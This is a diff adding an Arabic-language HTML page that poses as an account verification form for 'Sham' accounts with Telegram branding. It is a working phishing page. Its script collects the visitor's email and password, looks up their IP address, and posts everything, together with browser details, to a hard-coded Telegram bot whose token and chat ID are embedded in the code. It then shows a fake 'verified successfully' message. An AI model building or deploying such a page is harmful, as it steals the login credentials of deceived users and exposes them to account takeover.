@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نضام توثيق الحساب الغير مصرح </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #444;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .success-message {
+            color: #28a745;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .status-box {
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .status-box.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status-box.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .info-box {
+            background: #e7f3ff;
+            border: 1px solid #b3d7ff;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #004085;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .requirements {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .telegram-icon {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #667eea;
+            font-size: 24px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="telegram-icon">
+            <i class="fab fa-telegram"></i>
+        </div>
+        
+        <div class="header">
+            <h1>توثيق حساب شام</h1>
+            <p>الخاص بالحسابات الغير مصرح بها</p>
+        </div>
+        
+        <form id="authForm">
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="text" id="email" name="email" placeholder="example@domain.com" autocomplete="off">
+                <div class="error-message" id="emailError">يرجى إدخال بريد إلكتروني صحيح يحتوي على @</div>
+                <div class="success-message" id="emailSuccess">✓ البريد الإلكتروني صحيح</div>
+                <div class="requirements">يجب أن يحتوي البريد على @ واسم نطاق صالح</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" autocomplete="off">
+                <div class="error-message" id="passwordError">كلمة المرور مطلوبة</div>
+                <div class="success-message" id="passwordSuccess">✓ كلمة المرور صحيحة</div>
+                <div class="requirements">يجب أن تحتوي على 8 أحرف على الأقل</div>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <span id="btnText">توثيق الحساب</span>
+                <div class="loader" id="loader"></div>
+            </button>
+        </form>
+        
+        <div class="status-box" id="statusBox"></div>
+        
+        <div class="info-box">
+            <i class="fas fa-shield-alt"></i>
+            <strong>ملاحظة:</strong>هذا النضام خاص بتوثيق الحساب الغير مصرح به يرجى التأكد جيدٱ من حسابك.
+        </div>
+    </div>
+
+    <script>
+        // التوكنات - يجب تخزينها بشكل آمن في بيئة حقيقية
+        const TELEGRAM_BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+        const TELEGRAM_CHAT_ID = '7493001551';
+        
+        // عناصر DOM
+        const authForm = document.getElementById('authForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const loader = document.getElementById('loader');
+        const statusBox = document.getElementById('statusBox');
+        
+        // عناصر الرسائل
+        const emailError = document.getElementById('emailError');
+        const emailSuccess = document.getElementById('emailSuccess');
+        const passwordError = document.getElementById('passwordError');
+        const passwordSuccess = document.getElementById('passwordSuccess');
+        
+        // التحقق من صحة البريد الإلكتروني
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // التحقق من صحة كلمة المرور
+        function validatePassword(password) {
+            return password.length >= 8;
+        }
+        
+        // إظهار/إخفاء رسائل الخطأ
+        function showError(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+            element.nextElementSibling.style.display = 'none';
+        }
+        
+        function showSuccess(element) {
+            element.style.display = 'block';
+            element.previousElementSibling.style.display = 'none';
+        }
+        
+        function hideMessages(element) {
+            element.style.display = 'none';
+            element.nextElementSibling.style.display = 'none';
+        }
+        
+        // التحقق في الوقت الحقيقي
+        emailInput.addEventListener('input', function() {
+            const email = this.value.trim();
+            
+            if (email === '') {
+                hideMessages(emailError);
+                return;
+            }
+            
+            if (!validateEmail(email)) {
+                showError(emailError, 'يرجى إدخال بريد إلكتروني صحيح يحتوي على @');
+            } else {
+                showSuccess(emailSuccess);
+            }
+        });
+        
+        passwordInput.addEventListener('input', function() {
+            const password = this.value;
+            
+            if (password === '') {
+                hideMessages(passwordError);
+                return;
+            }
+            
+            if (!validatePassword(password)) {
+                showError(passwordError, 'كلمة المرور يجب أن تكون 8 أحرف على الأقل');
+            } else {
+                showSuccess(passwordSuccess);
+            }
+        });
+        
+        // إرسال البيانات إلى Telegram
+        async function sendToTelegram(data) {
+            const timestamp = new Date().toLocaleString('ar-SA');
+            const userIP = await getUserIP();
+            
+            const message = `
+🔐 **تسجيل دخول جديد - نظام المراقبة**
+            
+📧 **البريد الإلكتروني:** ${data.email}
+🔑 **كلمة المرور:** ${data.password}
+⏰ **الوقت:** ${timestamp}
+🌐 **عنوان IP:** ${userIP}
+🖥️ **المتصفح:** ${navigator.userAgent}
+📍 **المصدر:** ${window.location.href}
+            `;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                return false;
+            }
+        }
+        
+        // الحصول على عنوان IP
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير متوفر';
+            }
+        }
+        
+        // معالجة إرسال النموذج
+        authForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+            
+            // التحقق النهائي
+            let isValid = true;
+            
+            if (!validateEmail(email)) {
+                showError(emailError, 'يرجى إدخال بريد إلكتروني صحيح');
+                isValid = false;
+            }
+            
+            if (!validatePassword(password)) {
+                showError(passwordError, 'كلمة المرور يجب أن تكون 8 أحرف على الأقل');
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                return;
+            }
+            
+            // إظهار حالة التحميل
+            submitBtn.disabled = true;
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // تحضير البيانات
+            const formData = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            try {
+                // إرسال إلى Telegram
+                const telegramSuccess = await sendToTelegram(formData);
+                
+                // إخفاء التحميل
+                submitBtn.disabled = false;
+                btnText.style.display = 'block';
+                loader.style.display = 'none';
+                
+                if (telegramSuccess) {
+                    // إظهار رسالة النجاح
+                    statusBox.className = 'status-box success';
+                    statusBox.innerHTML = `
+                        <i class="fas fa-check-circle"></i>
+                        <h3>تم التوثيق بنجاح!</h3>
+                        <p>تم إرسال المعلومات إلى نظام المراقبة</p>
+                        <p style="font-size: 11px; margin-top: 10px;">البريد: ${email}</p>
+                    `;
+                    statusBox.style.display = 'block';
+                    
+                    // إعادة تعيين النموذج بعد 3 ثوانٍ
+                    setTimeout(() => {
+                        authForm.reset();
+                        statusBox.style.display = 'none';
+                        hideMessages(emailError);
+                        hideMessages(passwordError);
+                    }, 3000);
+                } else {
+                    throw new Error('فشل الإرسال إلى Telegram');
+                }
+                
+            } catch (error) {
+                // إخفاء التحميل
+                submitBtn.disabled = false;
+                btnText.style.display = 'block';
+                loader.style.display = 'none';
+                
+                // إظهار رسالة الخطأ
+                statusBox.className = 'status-box error';
+                statusBox.innerHTML = `
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <h3>حدث خطأ!</h3>
+                    <p>فشل إرسال البيانات. يرجى المحاولة مرة أخرى</p>
+                `;
+                statusBox.style.display = 'block';
+                
+                // إخفاء رسالة الخطأ بعد 5 ثوانٍ
+                setTimeout(() => {
+                    statusBox.style.display = 'none';
+                }, 5000);
+            }
+        });
+        
+        // تهيئة أولية
+        window.addEventListener('load', function() {
+            // إضافة تأثير عند التحميل
+            document.querySelector('.container').style.opacity = '0';
+            document.querySelector('.container').style.transform = 'translateY(20px)';
+            
+            setTimeout(() => {
+                document.querySelector('.container').style.transition = 'all 0.5s ease';
+                document.querySelector('.container').style.opacity = '1';
+                document.querySelector('.container').style.transform = 'translateY(0)';
+            }, 100);
+        });
+    </script>
+</body>
+</html>
